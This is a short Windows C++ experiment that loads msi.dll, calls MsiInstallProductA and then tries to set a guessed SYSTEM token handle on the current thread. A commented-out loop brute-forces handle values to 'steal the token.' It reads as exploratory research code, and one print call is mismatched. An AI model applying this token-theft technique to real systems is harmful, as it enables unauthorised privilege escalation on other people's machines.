//tok_play.cpp
#include "stdafx.h"
#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <iostream> //iostream sux
#include <commctrl.h>
#include <Winuser.h>
#define INFO_BUFFER_SIZE MAX_COMPUTERNAME_LENGTH + 1
#define PATH_SIZE INFO_BUFFER_SIZE + MAX_PATH + 4
typedef UINT (WINAPI *PFnMsiInstallProduct) (LPCSTR szPackagePath, LPCSTR szCommandLine);


int main(int argc, char* argv[]) {
	HANDLE hToken,hThread;
	HMODULE hMsi = 0;
	CHAR infoBuf[INFO_BUFFER_SIZE];
	//DWORD tid;
	DWORD bufCharCount = INFO_BUFFER_SIZE;
	//Get name of the computer. 	
	GetComputerName(infoBuf, &bufCharCount);
	printf("\n...Pausing, hit enter to continue with MSI.dll load.");
	getchar();
	//Why msi.dll?
	//We happened to know in this case (ahead of time) that msi.dll has functions inside it that 
	//get a token by requesting one from a *special* process via a *special* rpc named port.
	//we just wanna see what happens when this subthread gets the token.
	hMsi = LoadLibrary("msi.dll");
	PFnMsiInstallProduct MsiInstallProduct = 0;
	MsiInstallProduct = (PFnMsiInstallProduct)GetProcAddress(hMsi, "MsiInstallProductA");
	MsiInstallProduct("","");
	hThread=GetCurrentThread(); //tid = GetCurrentThreadId();
	//Get Local System account identity token and set it to current thread
	hToken=(void *)0x1;	
	printf("\nhToken Before: %x @ address 0x%x in thread: %x", hToken, hThread);
/*  a test to see if we can steal the token.
	while(SetThreadToken(&hThread,hToken)==NULL){
        hToken=(void*)((int)hToken+1);
	}
*/
	if(SetThreadToken(&hThread,hToken)!=NULL){
		printf("\n\tERROR #31337: Nah son, you aint down wit Shaolin.");
	}
	printf("\nhToken After: %x @ address 0x%x", hToken, &hToken);
	printf("\n...Pausing, hit enter to quit.");
	getchar(); 
};
